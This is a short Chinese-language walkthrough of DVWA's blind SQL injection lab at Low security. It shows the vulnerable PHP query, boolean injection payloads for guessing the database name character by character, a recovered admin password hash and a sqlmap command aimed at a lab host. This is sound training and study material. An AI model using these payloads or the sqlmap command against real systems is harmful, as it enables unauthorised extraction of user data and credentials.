# Low

## 源码

```php
$id = $_GET['id'];
$query = "SELECT ... FROM users WHERE user_id = '$id';";
// 无报错回显，只返回 EXISTS / MISSING
```

## 与 SQLi Low 的区别

| SQLi | SQLi Blind |
|------|-----------|
| 报错全量回显 | 报错被 `try/catch` 吃掉 |
| 能看到查询结果 | 只看得到"存在"/"不存在" |
| union 联合查直接脱裤 | 只能逐字符猜 |

## 攻击步骤

1. 确认注入点：
```
1' and 1=1#  → EXISTS   ✅
1' and 1=2#  → MISSING  ❌
```

2. 逐字符猜数据：
```
1' and length(database())=4#  → 库名 4 位
1' and ascii(substr(database(),1,1))=100# → d
...
库名 = dvwa
```

3. 得出数据
admin
5f4dcc3b5aa765d61d8327deb882cf99（MD5 可反查=password）
...


SQLmap 一把梭：
```bash
sqlmap -u "http://192.168.1.167:8083/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs
```

## 关键教训

盲注和普通 SQLi 底层原理一模一样——都是拼字符串。区别只是**输出从"看到数据"变成"看到真假"**，攻击手法从 union 变成逐字符布尔判断。
